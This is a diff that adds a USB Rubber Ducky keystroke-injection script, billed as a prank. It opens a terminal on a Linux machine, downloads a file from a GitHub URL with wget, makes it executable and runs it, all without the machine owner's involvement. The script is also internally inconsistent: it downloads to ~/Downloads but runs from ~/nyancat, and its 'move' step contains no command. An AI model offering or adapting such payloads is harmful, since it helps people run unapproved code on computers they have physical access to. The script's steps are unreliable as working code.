@@ -1,0 +1,26 @@
+REM Author - CrackedGh0st
+REM Target - Tested on Linux Mint, easy tweak for windows
+REM Purpose/Function - Pank without sudo downloads nayancat script, makes it exacutable and the runs it :) 
+
+DELAY 1000
+CTRL-ALT t
+DELAY 500
+DELAY 2000
+STRING wget -O ~/Downloads/nyancat.1 https://raw.githubusercontent.com/klange/nyancat/master/nyancat.1
+DELAY 500
+ENTER
+REM adjust the delay here at line 13. speed it up for faster computers and slow it down for older hardware
+DELAY 5000
+CTRL SHIFT t
+DELAY 500
+DELAY 2000
+REM Move the downloaded file to the Nyancat directory
+DELAY 500
+ENTER
+DELAY 1000
+STRING chmod +x ~/nyancat/nyancat.1
+DELAY 500
+ENTER
+STRING ~/nyancat/nyancat.1
+DELAY 500
+ENTER
